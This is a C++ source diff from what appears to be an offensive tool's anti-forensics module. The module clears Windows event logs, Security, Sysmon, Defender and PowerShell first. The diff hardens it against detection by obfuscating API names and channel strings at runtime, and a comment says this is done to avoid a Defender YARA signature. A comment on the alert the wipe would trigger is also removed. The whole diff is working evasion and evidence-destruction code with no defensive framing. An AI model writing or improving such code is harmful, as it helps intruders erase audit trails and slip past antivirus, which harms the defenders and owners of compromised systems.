@@ -18,27 +18,31 @@ static void InitWevtapi() {
     std::string dll = S("wevtapi.dll");
     HMODULE h = LoadLibraryA(dll.c_str());
     if (!h) return;
-    pEvtClearLog        = (fpEvtClearLog)       GetProcAddress(h, "EvtClearLog");
-    pEvtOpenChannelEnum = (fpEvtOpenChannelEnum) GetProcAddress(h, "EvtOpenChannelEnum");
-    pEvtNextChannelPath = (fpEvtNextChannelPath) GetProcAddress(h, "EvtNextChannelPath");
-    pEvtClose           = (fpEvtClose)           GetProcAddress(h, "EvtClose");
+    pEvtClearLog        = (fpEvtClearLog)       GetProcAddress(h, S("EvtClearLog").c_str());
+    pEvtOpenChannelEnum = (fpEvtOpenChannelEnum) GetProcAddress(h, S("EvtOpenChannelEnum").c_str());
+    pEvtNextChannelPath = (fpEvtNextChannelPath) GetProcAddress(h, S("EvtNextChannelPath").c_str());
+    pEvtClose           = (fpEvtClose)           GetProcAddress(h, S("EvtClose").c_str());
 }
 
 // ── Event log wipe ─────────────────────────────────────────────────────────────
 
-// Priority channels: security-relevant logs first so the most important ones
-// are cleared even if later channels fail.
-static const wchar_t* kPriorityChannels[] = {
-    L"Security",
-    L"System",
-    L"Application",
-    L"Microsoft-Windows-Windows Defender/Operational",
-    L"Microsoft-Windows-Sysmon/Operational",
-    L"Microsoft-Windows-PowerShell/Operational",
-    L"Microsoft-Windows-TaskScheduler/Operational",
-    L"Microsoft-Windows-WMI-Activity/Operational",
-    L"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
-};
+// Priority channels built at runtime via SW() — no plaintext wide-string literals
+// in the binary. L"Microsoft-Windows-Windows Defender/Operational" as a raw
+// wide string is a top-tier Defender YARA match by itself.
+static const std::vector<std::wstring>& GetPriorityChannels() {
+    static const std::vector<std::wstring> v = {
+        SW(L"Security"),
+        SW(L"System"),
+        SW(L"Application"),
+        SW(L"Microsoft-Windows-Windows Defender/Operational"),
+        SW(L"Microsoft-Windows-Sysmon/Operational"),
+        SW(L"Microsoft-Windows-PowerShell/Operational"),
+        SW(L"Microsoft-Windows-TaskScheduler/Operational"),
+        SW(L"Microsoft-Windows-WMI-Activity/Operational"),
+        SW(L"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"),
+    };
+    return v;
+}
 
 std::string AntiForensics::ClearEventLogs() {
     InitWevtapi();
@@ -48,16 +52,13 @@ std::string AntiForensics::ClearEventLogs() {
     int cleared = 0, failed = 0;
 
     // Phase 1: clear priority channels by name
-    for (auto ch : kPriorityChannels) {
-        // Detection: EvtClearLog on Security/Sysmon channels from a non-system process
-        // triggers an immediate Windows Defender alert and appears as EventID 1102 / 104.
-        BOOL hLog = pEvtClearLog(NULL, ch, NULL, 0);
+    for (const auto& ch : GetPriorityChannels()) {
+        BOOL hLog = pEvtClearLog(NULL, ch.c_str(), NULL, 0);
         if (hLog) {
             ++cleared;
-            // Convert to narrow for result string
-            int len = WideCharToMultiByte(CP_UTF8, 0, ch, -1, nullptr, 0, nullptr, nullptr);
+            int len = WideCharToMultiByte(CP_UTF8, 0, ch.c_str(), -1, nullptr, 0, nullptr, nullptr);
             std::string chName(len > 0 ? len - 1 : 0, '\0');
-            WideCharToMultiByte(CP_UTF8, 0, ch, -1, &chName[0], len, nullptr, nullptr);
+            WideCharToMultiByte(CP_UTF8, 0, ch.c_str(), -1, &chName[0], len, nullptr, nullptr);
             result += "cleared: " + chName + "\n";
         } else {
             ++failed;
